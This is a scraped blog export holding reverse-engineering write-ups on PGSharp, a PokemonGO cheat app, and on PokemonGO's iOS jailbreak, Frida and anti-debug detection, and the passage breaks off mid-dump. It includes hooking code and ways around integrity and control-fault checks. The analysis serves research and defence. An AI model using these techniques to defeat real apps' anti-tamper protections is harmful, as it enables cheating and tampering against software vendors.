function is called, PGSharp intercepts the nonce and forward the request to its servers:\nhttps://tens.pgsharp.com/v1/scc-2-eg[...]4/\nThe request is performed through a http POST, whose data are encrypted with AES. The clear payload has the following layout:\n{ \u0026#34;n\u0026#34;: \u0026#34;Cy[...]\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;attest\u0026#34;, \u0026#34;ver\u0026#34;: \u0026#34;\u0026lt;PGSharp Version\u0026gt;\u0026#34;, \u0026#34;k\u0026#34;: \u0026#34;i3[...]\u0026#34;, \u0026#34;clt\u0026#34;: \u0026#34;pgs\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;k\u0026#34;: \u0026#34;AIzaSyCh8l[...]_eOTXhM4 \u0026lt;- From nativeGetApiKey\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;\u0026lt;nonce\u0026gt;\u0026#34; } } On success, the server responses with an AES-encrypted payload which has the following layout:\n{\u0026#34;result\u0026#34;:\u0026#34;suc: \u0026lt;JWT SafetyNet Attestation\u0026gt;\u0026#34;} The JWT SafetyNet value is then forwarded by PGSharp to nativeAttestResponse() with the original nonce. At some point, this JWT attestation is sent to Niantic\u0026rsquo;s servers (on the endpoint plfe/112/rpc2) wrapped by a Protobuf structure.\nTo understand how they \u0026ldquo;bypass\u0026rdquo; SafetyNet, let\u0026rsquo;s look at the JWT payload:\n{ \u0026#34;nonce\u0026#34;: \u0026#34;\u0026lt;nonce\u0026gt;\u0026#34;, \u0026#34;timestampMs\u0026#34;: 1636265656, \u0026#34;apkPackageName\u0026#34;: \u0026#34;com.nianticlabs.pokemongo\u0026#34;, \u0026#34;apkDigestSha256\u0026#34;: \u0026#34;ioYmlh5mk5EhMUH/DsaG1jrhUoQJDK/2IvK61eiAXJE=\u0026#34;, \u0026#34;ctsProfileMatch\u0026#34;: true, \u0026#34;apkCertificateDigestSha256\u0026#34;: [ \u0026#34;lEvaRm6vZL4ck4ltXI6aRUoHyNj8vEre7vs1RbM16Xk=\u0026#34; ], \u0026#34;basicIntegrity\u0026#34;: true, \u0026#34;evaluationType\u0026#34;: \u0026#34;BASIC\u0026#34; } First of all, the JWT is correctly signed by Google SafetyNet\u0026rsquo;s key and the apkCertificateDigestSha256 matches the signature of the real PokemonGO application.\nBut \u0026hellip;\nThe value of apkDigestSha256 does not match the checksum of the genuine PokemonGO application 😕\nHere are my hypothesis:\nThe server https://tens.pgsharp.com/v1/scc-2-eg/... forwards the SafetyNet request to a real application that runs on a real device. This application would have been created by PGSharp authors to really run SafetyNet and to get a valid attestation signed with a valid Google key. The fake application would have been created with com.nianticlabs.pokemongo as package name and would implement signature mocking, as discussed in the first part.\nIf they would have managed to break SafetyNet, the apkDigestSha256 value would have been consistent.\nThe JWT attestation is forwarded to Niantic so they might check the consistency of apkDigestSha256 but they might only focus on the signature (which can be faked) and not this value \u0026hellip;\nWhen PGSharp avoids PokemonGO pitfalls As discussed in the section Signature Bypass, PGSharp tricks the Android PackageManager to mock the signature of the application.\nIt turns out that PGSharp is also concerned about app repackaging. As they provide premium features, they don\u0026rsquo;t want to be cheated \u0026hellip;\nIn the function associated with PGS_ACTIONS.INITPOST they perform a device fingerprint whose one of these elements is the APK\u0026rsquo;s signature. But instead of using the Android PackageManager to retrieve the signature, they use DimaKoz/stunning-signature to compute the MD5 digest of the signature.\nFinal Words When I started to look at this cheating app, I did not expect to find such nice tricks and challenges. The PGSharp\u0026rsquo;s authors know the sneaky tricks to hinder reverse engineering. Unfortunately, O-LLVM is relatively weak in this context compared to the commercial obfuscator used by Niantic.\nOn the other hand, the design of PokemonGO is such that all the reverse engineering difficulties lie in one single module that can be treated in black-box once we identified the API. In particular, the un-obfuscated Java layer helps a lot to identify these API.\nRegarding the signature bypass, at first, I thought it would be easy to prevent by checking the integrity of the .apk and/or the native libraries. But, there are some points that need to be taken into account:\nAPK Integrity Check\nNaively, we might want to compute a checksum of the APK or re-compute the signature (as it\u0026rsquo;s done by PGSharp). But in fact, since a few years, Google tries to push developers to use app bundle such as an application is no longer a single .apk but a split .apk. While this feature optimizes the device\u0026rsquo;s data partition size, it complicates the verification of the signature since it would require to deal with different files and different checksum.\nIt\u0026rsquo;s not infeasible, but it complicates its implementation in the APK build \u0026amp; development pipeline.\nNative Library Integrity Check\nI guess that libNianticLabsPlugin.so implements checksum on its own library as it is a sensitive part of the application. Regarding the other libraries, some of them are owned by Niantic (like libholoholo.so) and others come from third-parties (like libmain.so). Depending on how they are integrated, the checksum of these external libraries might not be easy to automatically compute while releasing a new version of PokemonGO. These third-party libraries are, most of the time, not copy-pasted by the developers but automatically bundled when compiling the application. Therefore, computing their checksums might require tweaking the build process in a non-easy way.\nOn the top of that, Niantic releases a new version of its games on a monthly basis. It means that these checks need to be automated in CI/CD pipeline which might not be trivial to do.\nIt was a funny and very interesting journey, for those who want to dig a bit more in PGSharp, I pushed some materials and documents on Github. In particular, you can find the symbol list of libmain.so based on reverse engineering.\n\u0026nbsp;\u0026nbsp;\u0026nbsp;https://github.com/romainthomas/pgsharp Acknowledgments This analysis has been independently done in my spare time while being at Quarkslab and UL, my current employer.\nAnnexes Third-Party Here is the (non exhaustive) list of the open-source projects used by PGSharp:\nhttps://github.com/jmpews/Dobby https://github.com/or-dvir/EasySettings https://github.com/zupet/LuaTinker or https://github.com/yanwei1983/luatinkerE https://github.com/DimaKoz/stunning-signature https://www.sqlite.org/index.html https://github.com/nlohmann/json https://www.lua.org/manual/5.3/ https://github.com/kikito/md5.lua https://github.com/rxi/json.lua List of the Unity Functions used by PGSharp \u0026nbsp;\u0026nbsp;Expand object__Invoke String_CreateString1 String_CreateString3 ulong_object___get_Item ulong_object___ContainsKey ulong_object___TryGetValue Application_OpenURL Application_set_targetFrameRate Quaternion_Angle PlayerPrefs_TrySetInt PlayerPrefs_TrySetFloat PlayerPrefs_TrySetSetString PlayerPrefs_SetInt PlayerPrefs_GetInt PlayerPrefs_SetFloat PlayerPrefs_GetFloat PlayerPrefs_SetString PlayerPrefs_GetStringNoDefault PlayerPrefs_HasKey PlayerPrefs_DeleteKey Component_get_gameObject Transform_get_rotation Animator_get_speed Animator_set_speed Animator_SetTriggerID Animator_Update Promise__ctor Promise_Complete MapMath_MetersBetween NL_NLAny_object_ NL_NLFirst_object_ InputField_ActivateInputField InputField_DeactivateInputField Text_set_text Text_set_fontSize DiContainer_InjectExplicitInternal Schedule_WaitOn_c__AnonStorey0____m__0 GameState_EnterState GameState_ExitState RpcBindings_Send RpcManager_DispatchCallbacks Animator_SetTriggerID RpcManager_DispatchCallbacks AuthService_get_CachedCredentialsExist AuthService_Logout DeviceServiceExtensions_IsUsable GameMasterData_IsPokemonWeatherBoosted Animator_SetTriggerID AuthService_get_CachedCredentialsExist AuthService_Logout PgpApi_UpdateNotifications ARPlusEncounterValuesProto__ctor ARPlusEncounterValuesProto__cctor PlayerService_GetPlayerDayBucket PlayerService_get_PlayerStats PlayerService_get_CurrentPokeball PlayerService_get_CurrentLinkedLogins AuthService_get_CachedCredentialsExist PlayerService_get_PokemonBag PlayerService_GetPlayerProfile PlayerService_set_CurrentPokeball PlayerService_get_BagIsFull PlayerService_GetCandyCountForPokemon StateToken_Complete TimeUtil_ServerNowMs RequestGymDetailsById_onSucceed RequestGymDetailsById_onError PlayerPrefs_SetInt BluetoothUtil_get_IsBluetoothEnabled PgpGuiController_ClickIcon PgpGuiService_SetSfidaIconVisible PgpGuiService_EnableSfidaIcon ulong_object___get_Item PgpService_get_IsSessionActive PgpService_GetCurrentNotificationType ItemBagImpl_GetItemCount PokemonBagImpl_GetPokemon ulong_object___get_Item PgpApi_UpdateNotifications Animator_set_speed StateToken_Complete VersionCheckService_CheckVersion ulong_object___TryGetValue QuestMapPokemon_get_Pokemon QuestService_BeginQuestEncounterWithOut EulaGuiController_PressAccept StarterMapPokemon_get_Pokemon OpenRemoteGym_gymOpner OpenRemoteGym_onSucceed BluetoothUtil_get_IsBluetoothEnabled QuestService_BeginQuestEncounterWithOut RaidState_ExitGymWithRaidDetails AccountChoiceState_ClickNewPlayer AccountChoiceState_ClickExistingPlayer LoginAgeGateState_SubmitSelections LoginChoiceState_ClickPtc LoginChoiceState_ClickGoogle LoginGuiController_ClickSubmit PtcLoginState_SubmitLogin I18n_PokemonMoveName I18n_SetUpLanguageTable I18n_PokemonNameTemporaryEvolution I18n_Text I18n_PokemonName FriendsGuiState_StartOpenGiftFlow FriendsGuiState_StartSendGiftFlow FriendsRpcService_RemoveGiftbox GiftingRpcService_SendGift GiftingRpcService_OpenGift StickerService_GetStickerInventory CombatDirector_Initialize MapPokestop_get_PoiId MapPokestop_get_ActiveIncidentType MapPokestop_get_Location EncounterParkCameraController_PlayIntro RunPokemonCaptured_onDitto EncounterInteractionState_RunAway MapMath_MetersBetween PlayerPrefs_TrySetSetString EncounterInteractionState_IntroCompleted AttemptCapture_onResponse EncounterIntroState_ExitState EncounterPokemon_get_MapPokemon PlayerPrefs_HasKey ItemBagImpl_GetItemCount Pokeball_TryHitPokemon Pokeball_FlyStateImpl_Capture__MoveNext Pokeball_DropStateImpl_Capture__MoveNext EncounterGuiController_ShowPokemonFlee EncounterState_get_EncounterType EncounterState_EncounterStateComplete EncounterState_EncounterStateComplete EncounterState_get_MapPokemon EncounterState_OnEncounterResponse DefaultEncounter_get_DefaultBall ExtraMapPokemon_get_Pokemon ResearchEncounter_get_DefaultBall ResearchEncounter_get_DefaultBall object_object__object___CurrentPageIndex PokemonInventoryCellView_Initialize ToastService_OneLineMedium ToastService_RewardItemNameAmount ToastService_RewardItemDefault ToastService_RewardItemStardust ToastService_OneLineMediumWithParams ToastService_RewardItemXlCandy ToastService_RewardItemAmount ToastService_TwoLine ToastService_RewardItemAmountType ToastService_RewardItemMegaResource ToastService_RewardSticker ToastService_OneLineWithParams ToastService_OneLineBig ToastService_OneLineBigWithParams ToastService_RewardItemCandy UserPromptsService_HasActiveModal UserPromptsService_DismissActiveModal PokemonInfoDynoScrollRect_Cleanup Quaternion_Angle Animator_get_speed PokemonInfoPanel_DoUpdate GymRootController_get_View GymRootController_get_MapGym MapGym_get_PoiId MapGym_OnTap MapGym_get_Location RaidMapPokemon_get_Pokemon MapContentHandler_UpdateCells MapEntityCell_get_Pois MapEntityService_get_Cells MapEntityService_GetMapPoi MapEntityService_UpdatePois MapExploreState_GymSelected MapExploreState_EnterQuestEncounter MapPokemon_get_Location MapPokemon_get_DespawnTime MapPokemon_TryCapture PhotobombingMapPokemon_get_Pokemon MapPokestop_get_ActiveIncidentType SendEncounterRequestCapture_onResponse PoiMapPokemon_get_SpawnPointId PoiMapPokemon_get_EncounterId WildMapPokemon_get_Pokemon WildMapPokemon_SendEncounterRequest PoiDirectoryService_AddPokemon PoiDirectoryService_RemovePokemon RaidMapPokemon_get_Pokemon IncidentMapPokemon_get_Pokemon IncenseMapPokemon_SendEncounterRequest IncenseMapPokemon_OnDestroy IncenseMapPokemon_get_Pokemon TroyDiskMapPokemon_SendEncounterRequest TroyDiskMapPokemon_get_Pokemon GroundTapHandler_OnTap GroundTapHandler_OnTap1 MapViewHandler_GetGroundLocation MapViewHandler_GetGroundPosition MapViewHandler_GetWorldLocation NL_NLFirst_object_ CompassGuiController_Update PlayerService_SetPlayerProto MapPokemon_LogEncounterMetrics O-LLVM provides control-flow obfuscation that can be recovered with emulation. On the other hand, the data-flow (function parameters, stack values, memory accesses) can be analysed at a basic-block level with static analysis.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nlibmain.so is also statically linked against other libraries like jmpews/Dobby, nlohmann/json, sqlite \u0026hellip;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nModded apps use similar tricks as discussed in Android Application Diffing: Analysis of Modded Version\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nIn order to arbitrarily call the underlying function when needed.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThe package names are stripped with Proguard but we can quite easily recover those packages.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nBasically, they renamed DobbyHook in FbbUePBslRNHWkdS\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThe event is triggered when nativeMuteMasterAudio or nativeRender is registered and they get the base address by iterating over /proc/\u0026lt;pid\u0026gt;/maps.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nO-LLVM seems not applied on this function\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nOne can also hook the AES encrypt/decrypt functions whose prototype is (uint8_*t key_schedule, uint8_t* inout_buffer, size_t size)\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":1636243200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"e1b2b14aab84fe49c5f5a99ad637a0da","permalink":"https://www.romainthomas.fr/post/21-11-pgsharp-analysis/","publishdate":"2021-11-07T00:00:00Z","relpermalink":"/post/21-11-pgsharp-analysis/","section":"post","summary":"This blog post is about the internal mechanisms of PGSharp, a cheat engine for PokemonGO.","tags":["Android","reverse engineering","obfuscation"],"title":"PGSharp: Analysis of a Cheating App for PokemonGO","type":"post"},{"authors":["Romain Thomas"],"categories":null,"content":" Slides Talk Blog Post PGSharp: Analysis of a Cheating App for PokemonGO\n","date":1636070400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"a48df6c4b5b94100898b669f445ec782","permalink":"https://www.romainthomas.fr/publication/21-ekoparty-mobile-hacking-space-pgsharp/","publishdate":"2021-11-05T00:00:00Z","relpermalink":"/publication/21-ekoparty-mobile-hacking-space-pgsharp/","section":"publication","summary":"PGSharp is a cheating app for PokemonGO that works on non-rooted devices. This talk introduces its functionalities and the protections used to prevent reverse-engineering.","tags":null,"title":"PGSharp: Analysis of a Cheat Engine on Android","type":"publication"},{"authors":["Romain Thomas"],"categories":["iOS","Reverse Engineering"],"content":" Note Do not expect a click \u0026amp; play solution for PokemonGO in this blog post. This blog post is more about the technical aspects of jailbreak detection than a bypass for this game. Introduction While working on LIEF during my vacations to support in-memory parsing for Mach-O files, I found that PokemonGO was an interesting use case to introduce this feature. It led me to look at the jailbreak and Frida detection implemented in this game. Being more familiar with Android than iOS, the analysis workflow on this platform is quite different, which is also a good opportunity to improve tooling.\nThe first challenge stems from jailbreaking the device. Fortunately, checkra1n eases this step. The second difficulty lies in extracting the encrypted iOS app from the device. In contrast to Android, iOS apps are encrypted on the disk and decrypted by the kernel when loaded. It means that one way to get the unencrypted code is to dump the file from memory. One could also leverage the function mremap_encrypted() as described in Decrypting Apps on iOS.\nPokemonGO Overview When running PokemonGO on a jailbroken device1, the application immediately crashes with the following backtrace:\n0 ??? 0x000000020ac46ab8 0 + 8770579128 1 libdyld.dylib 0x0000000184df8304 invocation function for block in dyld3::AllImages::runAllInitializersInImage(dyld3::closure::Image const*, dyld3::MachOLoaded const*) + 136 2 libdyld.dylib 0x0000000184dea5b0 dyld3::closure::Image::forEachInitializer(void const*, void (void const*) block_pointer) const + 96 3 libdyld.dylib 0x0000000184df8160 invocation function for block in dyld3::AllImages::runInitialzersBottomUp(dyld3::closure::Image const*) + 296 4 libdyld.dylib 0x0000000184deae6c dyld3::closure::Image::forEachImageToInitBefore(void (unsigned int, bool\u0026amp;) block_pointer) const + 92 5 libdyld.dylib 0x0000000184df8b48 dyld3::AllImages::loadImage(Diagnostics\u0026amp;, char const*, unsigned int, dyld3::closure::DlopenClosure const*, bool, bool, bool, bool, void const*) + 776 6 libdyld.dylib 0x0000000184df8698 dyld3::AllImages::dlopen(Diagnostics\u0026amp;, char const*, bool, bool, bool, bool, bool, void const*, bool) + 872 7 libdyld.dylib 0x0000000184dfa2b4 dyld3::dlopen_internal(char const*, int, void*) + 368 8 libdyld.dylib 0x0000000184ded5b0 dlopen_internal(char const*, int, void*) + 108 9 CoreFoundation 0x00000001850ed038 _CFBundleDlfcnLoadFramework + 136 10 CoreFoundation 0x00000001850be974 _CFBundleLoadExecutableAndReturnError + 376 11 Foundation 0x0000000186359ba8 -[NSBundle loadAndReturnError:] + 332 12 pokemongo 0x00000001041a7c5c 0x1041a0000 + 31836 13 pokemongo 0x00000001041a7d50 0x1041a0000 + 32080 14 libdyld.dylib 0x0000000184de9588 start + 4 The full crash log is available here. In this backtrace, the main pokemongo binary is a kind of stub that loads the Unity binary: UnityFramework which contains the main logic of the game.\nThis library is loaded by the dlopen_internal function at index 8 in the backtrace as a result of -[NSBundle loadAndReturnError:]. Since UnityFramework depends on other libraries, they are (pre)loaded with Image::forEachImageToInitBefore which processes the following files:\n@/usr/lib/libc++.1.dylib \u0026hellip; @rpath/NianticLabsPlugin.framework/NianticLabsPlugin \u0026hellip; @rpath/libswiftos.dylib Among those dependencies, we can notice the NianticLabsPlugin library which is a cross-platform Unity plugin \u0026ndash; also present in the Android version \u0026ndash; that contains the main protections of the game. These protections are used to prevent cheat, bots, GPS spoofing, in PokemonGO. The whole being obfuscated by Digital.ai (formerly known as Arxan). NianticLabsPlugin communicates with the UnityFramework through an exported function GetN2Api that returns an array of functions (pointers).\nThe following figure outlines these different components:\nGetting back to the backtrace, if we assume that the application crashes when loading NianticLabsPlugin, it precisely crashes when calling the Mach-O constructors in AllImages::runAllInitializersInImage. Since the application is heavily obfuscated, a static analysis reaches quickly its limits, which forces us to emulate or dynamically analyze the functions of interest.\nNote The addresses of the functions/instructions mentioned in this blog post are based on the following version of NianticLabsPlugin:\nNianticLabsPlugin - 2140426ccdfdfb2529f454697cb5cc83\nPokemonGO v0.211.2 - June 2021\nAnalyzing Mach-O constructors with Frida From the previous section, we surmised that the application crashed because of the NianticLabsPlugin\u0026rsquo;s constructors. Since these functions are called before any other functions of the library, it raises the question of finding a way to perform actions (or hook) before they are executed.\nOn Android, when we need to analyse a library\u0026rsquo;s constructors, we can hook the call_array function from Bionic\u0026rsquo;s linker (ELF loader):\nIf we try to apply the same approach on iOS, the mirror of the ELF loader on iOS is dyld which contains most of the logic to load Mach-O files. It turns out that at some points, the Mach-O\u0026rsquo;s constructors are processed in the doModInitFunctions function (from ImageLoaderMachO.cpp).\nvoid ImageLoaderMachO::doModInitFunctions(const LinkContext\u0026amp; context) { ... for (const struct macho_section* sect=sectionsStart; sect \u0026lt; sectionsEnd; ++sect) { const uint8_t type = sect-\u0026gt;flags \u0026amp; SECTION_TYPE; if ( type == S_MOD_INIT_FUNC_POINTERS ) { Initializer* inits = (Initializer*)(sect-\u0026gt;addr + fSlide); ... if (!this-\u0026gt;containsAddress(stripPointer((void*)func)) ) { dyld::throwf(\u0026#34;initializer function %p not in mapped image for %s\\n\u0026#34;, func, this-\u0026gt;getPath()); } ... func(context.argc, context.argv, context.envp, context.apple, \u0026amp;context.programVars); } } ... } From this code, we can notice that all constructor addresses are checked beforehand by the containsAddress function. Therefore, it makes this function a good hooking spot as it is executed before calling the constructor itself. One can use the native SDK of frida-gum to perform this action:\n// Address of ImageLoader::containsAddress in /usr/lib/dyld const uintptr_t containsAddress_ptr = ...; // Setup hooks with gum_interceptor_attach GumAttachReturn attach_ret = gum_interceptor_attach( listener_-\u0026gt;interceptor, /* target */ reinterpret_cast\u0026lt;void*\u0026gt;(containsAddress_ptr), reinterpret_cast\u0026lt;GumInvocationListener*\u0026gt;(listener_), /* ID */ reinterpret_cast\u0026lt;void*\u0026gt;(containsAddress_ptr) ); .... // Equivalent of onEnter in Javascript void native_listener_on_enter(GumInvocationListener* listener, GumInvocationContext* ic) { const uintptr_t ctor_function_addr = ic-\u0026gt;cpu_context-\u0026gt;x[1]; // Do stuff with ctor_function_addr } containsAddress is a member function, therefore x0 contains a pointer on this and the address to check is located in x1. By hooking containsAddress(), we get the control before the execution of the constructors. It gives us the ability to perform the following actions that can help to identify the constructor involved in the crash:\nTrace the constructors (see: constructors_trace.log) Replace/disable a constructor (gum_interceptor_replace) Detect the first constructor and hook the next ones (gum_interceptor_attach) NianticLabsPlugin embeds no less than 120 constructors among those, 62 are involved in detecting Frida, jailbroken devices, anti-debug, etc:\nIndex Offset Description 15 0x4369e0 Anti-debug \u0026amp; anti-emulation 16 0x00e0d8 Frida detection 17 0x26bd5c Anti-bypass? 18 0x449b84 Anti-jailbreak, anti-Frida 19 0x731b90 Anti-jailbreak, anti-debug, anti-frida 20 0x359194 Anti-jailbreak Once we reduced the set of functions involved in the crash, we can combine dynamic analysis with Frida and emulation with Unicorn.\nAnti-debug One of the redundant checks we can find in many functions (not only the constructors) are the anti-debugs. They always come in two parts:\nTry to \u0026ldquo;kill\u0026rdquo; its own pid with the 0-signal Check if PTRACE is flagged void try_kill() { const int pid = getpid(); // syscall@0x436cdc int ret = kill(pid, 0); // syscall@0x436d28 } According to the man page of kill (man 2 kill), the signal 0 is used to check that the pid given in the first parameter really exists.\n[\u0026hellip;] A value of 0, however, will cause error checking to be performed (with no signal being sent). This can be used to check the validity of pid.\nThis kill operation is followed by three PTRACE checks:\n// Done three times inline bool ptrace_detect() { int32_t opt[4] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid(), }; kinfo_proc info; sysctl(opt, 4, \u0026amp;info, sizeof(kinfo_proc), nullptr, 0); return info.kp_proc.p_flag \u0026amp; P_TRACED; } These three P_TRACED checks always come together:\n0x436cdc: getpid(): 6015 0x436d28: kill(6015, 0): 0 0x4374b0: sysctl(CTL_KERN, KERN_PROC, KERN_PROC_PID, 6015) 0x4371e8: sysctl(CTL_KERN, KERN_PROC, KERN_PROC_PID, 6015) 0x437398: sysctl(CTL_KERN, KERN_PROC, KERN_PROC_PID, 6015) Frida Detection Frida is detected by the application through its client-server mode, which binds the localhost on the port 27042. When PokemonGO is starting, it tries to open a socket on this port and if it manages to connect, it tests the Frida handshake.\n0x00e3b8: getifaddrs(0x16b7fb518): 0x0 0x016990: socket(\u0026#39;IPV4\u0026#39;, \u0026#39;TCP\u0026#39;, \u0026#39;0\u0026#39;): 0x8 0x019d60: bind(\u0026#39;PF_INET\u0026#39;, 0x8, \u0026#39;127.0.0.1:27042\u0026#39;) 0x01805c: close(0x8) 0x016990: socket(\u0026#39;IPV4\u0026#39;, \u0026#39;TCP\u0026#39;, \u0026#39;0\u0026#39;): 0x8 0x019d60: bind(\u0026#39;PF_INET\u0026#39;, 0x8, \u0026#39;192.168.0.26:27042\u0026#39;) 0x01805c: close(0x8) 0x00e3ec: freeifaddrs(0x10601ac00): 0x105360a00 The application also iterates over the list of the libraries loaded in memory with the _dyld_image_count/_dyld_get_image_name functions. Nevertheless, it seems that they are not used to detect Frida libraries artifacts (like FridaGadget.dylib).\nJailbreak Detection The application implements jailbreak detection by checking if some files are accessible or not on the device. Most of the checks are done by using the access() syscalls that are inlined in different places:\n0x44c390: access(\u0026#39;/bin/grep\u0026#39;, 0x0) ... 0x7326b0: access(\u0026#39;/private/var/checkra1n.dmg\u0026#39;, 0x0) The list of the checked files is given in the annexes of the blog post.\nThis list is very close to vnodebypass/hidePathList.plist In addition to raw access syscall, the application enhances its detection by creating a symbolic link of the root directory in a temporary app data directory:\n0x734e08: symlink(\u0026#39;/Applications/..\u0026#39;, \u0026#39;/private/var/mobile/Containers/Data/Application/D933FBC9-90E7-4584-851E-CE2D5E900446/tmp/WCH38bnM0x101a9e7d0\u0026#39;) Then, it performs the same checks with the app data directory as prefix: [...]/tmp/WCH38bnM0x101a9e7d0:\n0x7376d8: access(\u0026#39;/private/var/mobile/Containers/Data/Application/D933FBC9-90E7-4584-851E-CE2D5E900446/tmp/3Odis0x101a9dfd0/usr/bin/passwd\u0026#39;, 0x0) Signature Check At some point, one function checks the integrity of the signature of the pokemongo binary. This check starts by opening the main pokemongo binary from the disk:\n0x7392ec: add x0, x19, #6,lsl#12 0x7392f0: add x0, x0, #0x540 0x7392f4: mov w1, #0x1000000 0x7392f8: mov x2, #0 0x7392fc: svc 0x80 ; x16 -\u0026gt; SYS_open = 5 // open(\u0026#39;/private/var/containers/Bundle/Application/[...]/pokemongo.app/pokemongo\u0026#39;): fd_pgo Then, it reads the beginning of the file in a stack buffer:\n0x74b494: ldr x0, [x19, #0xc0] ; fd 0x74b498: ldr x1, [x19, #0x130] ; buff 0x74b49c: ldr x2, [x19, #0xb8] ; buff_size 0x74b4a0: svc 0x80 ; x16 -\u0026gt; SYS_read = 3 // uint8_t macho_head[0x4167]; // 0x74b4a0: read(fd_pgo, macho_header, 0x4167); to iterate over the Mach-O load commands:\n; x8 points to the read\u0026#39;s buffer 0x73942c: ldr w8, [x8, #0x10] ; Number of LC_COMMANDS for (size_t i = 0; i \u0026lt; nb_cmds; ++i) { 0x74bc40: ldr w10, [x9, #4] ; Command\u0026#39;s size 0x74ade4: ldr w9, [x9] ; command\u0026#39;s type if (cmd.type == LC_CODE_SIGNATURE) { 0x74b1b8: ldr w10, [x10, #8] ; read signature offset -\u0026gt; 0xc3d0 } } With the offset of the Mach-O LC_CODE_SIGNATURE command, it reads the raw signature using the lseek/read syscalls:\nuint8_t sig_header[0x205]; 0x73a978: lseek(fd_pgo, LC_CODE_SIGNATURE offset, 0x0) 0x73aecc: read(fd_pgo, \u0026amp;sig_header, 0x205); The raw signature buffer is processed by chunks of 10 bytes in a function that looks like a checksum:\n[...] 0x73ad58: ldrsb w13, [x12] 0x73ad5c: mov w14, #83 0x73ad60: sub w13, w14, w13 0x73ad64: ldrsb w14, [x12, #1] 0x73ad68: mov w15, #87 0x73ad6c: sub w14, w15, w14 0x73ad70: ldrsb w16, [x12, #2] 0x73ad74: mov w17, #53 0x73ad78: sub w16, w17, w16 0x73ad7c: ldrsb w17, [x12, #3] 0x73ad80: mov w0, #52 0x73ad84: sub w17, w0, w17 0x73ad88: ldrsb w0, [x12, #4] 0x73ad8c: sub w0, w15, w0 0x73ad90: ldrsb w1, [x12, #5] 0x73ad94: mov w2, #51 0x73ad98: sub w1, w2, w1 0x73ad9c: ldrsb w2, [x12, #6] 0x73ada0: mov w3, #54 0x73ada4: sub w2, w3, w2 0x73ada8: ldrsb w3, [x12, #7] 0x73adac: sub w15, w15, w3 0x73adb0: ldrsb w3, [x12, #8] 0x73adb4: mov w4, #78 0x73adb8: sub w3, w4, w3 0x73adbc: ldrsb w12, [x12, #9] 0x73adc0: mov w4, #70 0x73adc4: sub w4, w4, w12 [...] I did not manage to identify the underlying checksum algorithm, but it involves square multiplications and the key(?): SW5436NF\nControl-Fault Injection Once we determined the functions involved in the detections, we might want to disable them in order to run the game smoothly. Actually, PokemonGO is protected against such bypass with global variables that assert if a function ran successfully or not.\nThis protection is equivalent to the following piece of code:\nstatic constexpr uintptr_t GOOD = 0x00627178; // bqx ? static uintptr_t MAGIC_CFI = 0xdeadc0de; __attribute__((constructor)) void frida_detect() { if (is_frida_running()) { crash(); } MAGIC_CFI = GOOD; } __attribute__((constructor)) void control_fault_check() { if (MAGIC_CFI != GOOD) { crash(); } } If we only disable frida_detect(), the application will crash because of control_fault_check().\nWe could bypass this protection by identifying the address of the MAGIC_CFI in the __data section, or by disabling the control_fault_check().\nWhat about LIEF? As mentioned in the introduction, it started with an ongoing feature to parse Mach-O files from memory. Basically, LIEF will3 enable to parse Mach-O files4 from an absolute address with this kind of API:\n// 0x10234400 -\u0026gt; start of the Mach-O file auto bin = LIEF::MachO::Parser::parse_from_memory(0x10234400); Depending on the user\u0026rsquo;s needs, the write() operation will optionally undo all the relocations and the symbol bindings. This could be useful if we aim at (re)running the file dumped (on a Apple M1?).\nAs expected, the strings used within the NianticLabsPlugin library are encoded by the obfuscator. We could statically analyze the decoding routine (cf. Tim Blazytko\u0026rsquo;s blog post) ,but another technique consists in using a property of the obfuscator\u0026rsquo;s string encoding mechanism.\nIt seems that the obfuscator put all the strings5 in the data section and decrypts all of them in a single constructor function.\nFor instance, if we have the string \u0026ldquo;TOKEN\u0026rdquo; to protect in the following functions:\nvoid protect_me() { sensitive(\u0026#34;TOKEN\u0026#34;); } void protect_me_2() { sensitive(\u0026#34;TOKEN2\u0026#34;); } The obfuscator transforms and decodes the strings into something like:\n// __data section static char var_TOKEN[] = \u0026#34;\\x00\\x1D\\xDD\\xEE\\xAB\u0026#34;; static char var_TOKEN_2[] = \u0026#34;\\x00\\x1D\\xDD\\xEE\\xAF\u0026#34;; __attribute__((constructor)) void decode_strings() { decode(var_TOKEN); decode(var_TOKEN_2); } void protect_me() { sensitive(var_TOKEN); } void protect_me_2() { sensitive(var_TOKEN_2); } Since all the strings are decoded at once in one of the first constructors, if we manage to dump the binary right after this constructor, we can recover the original strings for free.\nProgrammatically, it can be done using (again) frida-gum SDK with the following pseudocode:\n// Hook associated with ImageLoader::containsAddress void native_listener_on_enter(GumInvocationListener* listener, GumInvocationContext* ic) { static size_t CTOR_ID = 0; const uintptr_t ctor_function_addr = ic-\u0026gt;cpu_context-\u0026gt;x[1]; std::string libname = module_from_addr(ctor_function_addr); if (libname == \u0026#34;NianticLabsPlugin\u0026#34; \u0026amp;\u0026amp; CTOR_ID++ == 3) { const uintptr_t base_address = base_addr_from_ptr(ctor_function_addr); auto bin = LIEF::MachO::Parser::parse_from_memory(base_address); bin-\u0026gt;write(\u0026#34;/tmp/pokemongo_after_ctor.bin\u0026#34;); // /tmp on the iPhone } } In the end, the dumped file contains the decoded strings:\nIf we skim the __data section, we can also observe the following changes:\nA practiced eye might notice6 that some strings of the section are actually embedded in protobuf structures. We can confirm this observation by trying to infer the data as protobuf types:\nfrom . import proto_dump import lief pgo = lief.parse(\u0026#34;pokemongo_after_ctor.bin\u0026#34;) start = 0x12A51A7 end = 0x12A51E2 raw_proto = pgo.get_content_from_virtual_address(start, end - start) print(proto_dump(raw_proto)) { #3 = 4 #4 (repeated) = 1 { #1 = \u0026#34;CheatReputation\u0026#34; #2 (repeated) = { #1 = 